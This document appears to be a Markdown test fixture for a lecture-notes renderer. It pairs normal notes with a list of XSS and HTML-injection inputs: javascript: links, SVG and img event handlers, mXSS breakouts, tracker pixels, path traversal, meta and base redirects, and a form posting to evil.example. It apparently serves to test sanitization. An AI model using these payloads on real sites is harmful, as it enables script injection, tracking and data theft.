---
tags: [lecture/L3]
---

# L3 hostile 總整理

## 正常內容

- ==重點== 正常 bullet `(V1 00:05)`
- 一張投影片：![[c01_frame_0001.png]]
- <details open><summary>可以保留的 HTML</summary>內容 <sup>1</sup> <br> 換行</details>

## 惡意內容

- 連結 [javascript link](javascript:window.__pwned='md-href') `(V1 00:10)`
- 實體編碼 [encoded](jav&#x61;script:window.__pwned='entity')
- 大小寫空白 <a href="  JaVaScRiPt:window.__pwned='mixed'">mixed case</a>
- data URL <img src="data:image/svg+xml,%3Csvg onload=alert(1)%3E">
- 外部追蹤 <img src="https://tracker.example/pixel.gif"> 與 <img src="//tracker.example/p.gif">
- 跳脫路徑 <img src="../../../secret.png"> 與 <img src="..%2f..%2fsecret.png">
- SVG <svg onload="window.__pwned='svg'"><circle r="1"/></svg>
- iframe <iframe src="javascript:window.__pwned='iframe'"></iframe>
- object <object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y">
- form <form action="https://evil.example/collect"><input name="q"><button>送出</button></form>
- base <base href="https://evil.example/">
- meta <meta http-equiv="refresh" content="0;url=https://evil.example">
- style <style>body{background:url(https://tracker.example/css)}</style>
- inline style <span style="color: red; background:url(https://tracker.example/y)">紅字</span>
- 保留 id <div id="player">冒充播放器</div>
- 註解 <!-- <script>window.__pwned='comment'</script> -->
- mXSS <noscript><p title="</noscript><img src=x onerror=window.__pwned='mxss'>"></noscript>
- textarea <textarea></textarea><img src=x onerror="window.__pwned='textarea'">
- math <math><mi xlink:href="javascript:window.__pwned='math'">x</mi></math>
- 事件 <b onclick="window.__pwned='onclick'" onmouseover="window.__pwned='hover'">粗體</b>
- 結束 script 的文字：</script><script>window.__pwned='breakout'</script>
